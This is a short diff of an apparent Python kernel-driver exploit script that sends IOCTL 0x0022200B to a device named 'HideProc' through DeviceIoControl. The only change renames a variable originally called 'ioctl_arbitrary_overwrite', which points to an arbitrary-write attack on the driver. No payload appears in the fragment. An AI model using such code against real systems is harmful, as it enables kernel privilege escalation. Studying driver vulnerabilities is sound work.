@@ -43,14 +43,14 @@ if __name__ == "__main__":
     # constant declaration
     buffer_size = 0x8
     bytes_returned = c_ulong()
-    ioctl_arbitrary_overwrite = 0x0022200B
+    IOCTL = 0x0022200B
     device_name = "\\\\.\\HideProc"
 
     device_handle = get_device_handle(device_name)
 
     
     success = kernel32.DeviceIoControl(device_handle,
-                                       ioctl_arbitrary_overwrite,
+                                       IOCTL,
                                        0,
                                        buffer_size,
                                        None,
